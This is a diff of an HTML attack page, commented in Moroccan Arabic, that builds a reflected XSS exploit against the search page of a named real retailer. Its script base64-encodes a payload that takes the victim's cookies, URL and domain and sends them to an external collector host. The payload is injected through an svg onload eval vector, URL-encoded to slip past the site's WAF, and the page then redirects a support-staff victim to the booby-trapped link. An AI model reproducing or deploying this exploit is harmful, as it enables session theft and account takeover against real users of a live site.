@@ -2,27 +2,26 @@
 <html>
 <body>
     <script>
-        // 1. هاد الكود هو "السم" (Payload) اللي غيتنفذ داخل Decathlon
-        let exploit = `
-            var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com";
-            var exfil = {
-                target: "DECATHLON_HACKED",
+        // 1. هاد الكود هو اللي غادي يتنفذ داخل Decathlon لسحب الداتا
+        var code = `
+            var data = {
+                site: document.domain,
                 cookies: document.cookie,
                 url: window.location.href
             };
-            var data = btoa(JSON.stringify(exfil));
-            window.location.href = collab + "/?leaked=" + data;
+            var exfil = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com/?data=" + btoa(JSON.stringify(data));
+            window.location.href = exfil;
         `;
 
-        // 2. تشفير الكود باش يدوز من الـ WAF ديالهم
-        let encodedExploit = btoa(exploit);
+        // 2. تشفير الكود باش يدوز من الحماية
+        var payload = btoa(code);
 
-        // 3. رابط Decathlon الملغم بالـ XSS
-        // استعملنا svg حيت كيدوز من الفلاتر مزيان
-        let decathlonXss = "https://www.decathlon.com/search?q=<svg/onload=eval(atob('" + encodedPayload + "'))>";
+        // 3. رابط Decathlon باستعمال ثغرة الـ XSS في البحث
+        // استعملنا URL Encoding (%3C و %3E) باش نهربو من الـ WAF
+        var xssUrl = "https://www.decathlon.com/search?q=%3Csvg/onload=eval(atob('" + payload + "'))%3E";
 
-        // 4. تحويل الضحية (Support) للرابط الملغم
-        window.location.href = decathlonXss;
+        // 4. تنفيذ الهجوم
+        window.location.href = xssUrl;
     </script>
 </body>
 </html>
